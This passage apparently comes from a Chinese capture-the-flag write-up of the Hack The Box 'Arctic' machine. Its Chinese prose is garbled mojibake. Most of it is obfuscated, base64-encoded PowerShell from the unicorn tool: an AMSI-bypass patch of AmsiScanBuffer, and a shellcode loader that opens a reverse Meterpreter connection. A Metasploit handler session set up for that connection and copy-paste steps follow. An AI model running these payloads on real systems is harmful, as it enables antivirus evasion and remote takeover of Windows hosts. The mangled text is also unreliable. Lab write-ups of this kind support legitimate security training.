('JABWAGUAbABqAG4AIAA9ACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVwBpAG4AMwAyACAAewBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABJAG4AdABQAHQAcgAgAGgATQBvAGQAdQBsAGUALAAgAHMAdAByAGkAbgBnACAAcAByAG8AYwBOAGEAbQBlACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlACIAKwAiAHIAIgArACIAbgBlAGwAMwAyACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABsAHAAZgBsAE8AbABkAFAAcgBvAHQAZQBjAHQAKQA7AH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAkAFYAZQBsAGoAbgA7ACQAbQBFAE4AYQBiAGkAIAA9ACAAWwBXAGkAbgAzADIAXQA6ADoARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAWwBXAGkAbgAzADIAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgBBACIAKwAiAG0AIgArACIAcwBpAC4AZAAiACsAIgBsACIAKwAiAGwAIgApACwAIAAiAEEAIgArACIAbQAiACsAIgBzAGkAUwBjAGEAbgBCAHUAZgBmACIAKwAiAGUAIgArACIAcgAiACkAOwAkAE8AbQBSAGMAaQBpAHUAUwBlAFUAIAA9ACAAMAA7AFsAVwBpAG4AMwAyAF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQAbQBFAE4AYQBiAGkALAAgAFsAdQBpAG4AdAAzADIAXQBbAHUAaQBuAHQAMwAyAF0ANQAsACAAMAB4ADQAMAAsACAAWwByAGUAZgBdACQATwBtAFIAYwBpAGkAdQBTAGUAVQApADsAJABIAFUAQQBRAFQAVABrACAAPQAgACgAIgB9AHgAZgBaAGYAeABsAHUAUgAsACAAfQB4AGkAagBYAGgASwB0AE8ALAAgAH0AeAB9AH0ALAAgAH0AeAB9ADcALAAgAH0AeAA4AH0ALAAgAH0AeABDADMAIgApAC4AcgBlAHAAbABhAGMAZQAoACIAaQBqAFgAaABLAHQATwAiACwAIAAiADUANwAiACkALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAgACIAMAAiACkALgByAGUAcABsAGEAYwBlACgAIgBmAFoAZgB4AGwAdQBSACIALAAgACIAQgA4ACIAKQA7ACQASABVAEEAUQBUAFQAawAgAD0AIABbAEIAeQB0AGUAWwBdAF0AKAAkAEgAVQBBAFEAVABUAGsAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBDAG8AcAB5ACgAJABIAFUAQQBRAFQAVABrACwAIAAwACwAIAAkAG0ARQBOAGEAYgBpACwAIAA2ACkA')\"\n\n# actual unicorn payload\npowershell /w 1 /C \"sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() ('JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg'+'ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgAEkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArACIAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA'+'==')\"\n```\nä¸€ä¸ªæ˜¯ powershell çš„æ”»å‡»ä»£ç \n\næˆ‘ä»¬å¤åˆ¶è¿›å»\n\nç„¶åæˆ‘ä»¬ä½¿ç”¨ msfconsole åŠ è½½ unicorn.rc\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn]\nâ””â”€# msfconsole -r unicorn.rc \n\n\n                                   .,,.                  .\n                                .\\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P\n                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p\n                  d888888P      '7$$$$\\\"\"\"\"''^^`` .7$$$|D*\"'```         ?88'\n  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*\"`   d8P       ?8b  88P\n  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*\"`       d8P d8888b $whi?88b 88b\n d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*\" ?88,.d88b, d88 d8P' ?88 88P `?8b\nd88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*\"`    `?88'  ?88 ?88 88b  d88 d88\n                          .a#$$$$$$\"`          88b  d8P  88b`?8888P'\n                       ,s$$$$$$$\"`             888888P'   88n      _.,,,ass;:\n                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'\n                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'\n              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'\n           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--\"\"''^^/$$$$$$'\n_______________________________________________________________   ,&$$$$$$'_____\n                                                                 ll&&$$$$'\n                                                              .;;lll&&&&'\n                                                            ...;;lllll&'\n                                                          ......;;;llll;;;....\n                                                           ` ......;;;;... .  .\n\n       =[ metasploit v6.0.45-dev                          ]\n+ -- --=[ 2134 exploits - 1139 auxiliary - 364 post       ]\n+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 8 evasion                                       ]\n\nMetasploit tip: Save the current environment with the \nsave command, future console restarts will use this \nenvironment again\n\n[*] Processing unicorn.rc for ERB directives.\nresource (unicorn.rc)> use multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nresource (unicorn.rc)> set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nresource (unicorn.rc)> set LHOST 10.10.16.4\nLHOST => 10.10.16.4\nresource (unicorn.rc)> set LPORT 5555\nLPORT => 5555\nresource (unicorn.rc)> set ExitOnSession false\nExitOnSession => false\nresource (unicorn.rc)> set AutoVerifySession false\nAutoVerifySession => false\nresource (unicorn.rc)> set AutoSystemInfo false\nAutoSystemInfo => false\nresource (unicorn.rc)> set AutoLoadStdapi false\nAutoLoadStdapi => false\nresource (unicorn.rc)> exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 10.10.16.4:5555\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn]\nâ””â”€# cat powershell_attack.txt|xclip\n```\næŠŠ poweshell çš„æ”»å‡»è„šæœ¬å¤åˆ¶åˆ°å‰ªåˆ‡æ¿\n\n```bash\npowershell /w 1 /C \"\n```\nåˆ æ‰å‰é¢çš„å†…å®¹å’Œæœ€åçš„åŒå¼•å·\n\n```bash\nsv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() ('JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg'+'ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgAEkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArAC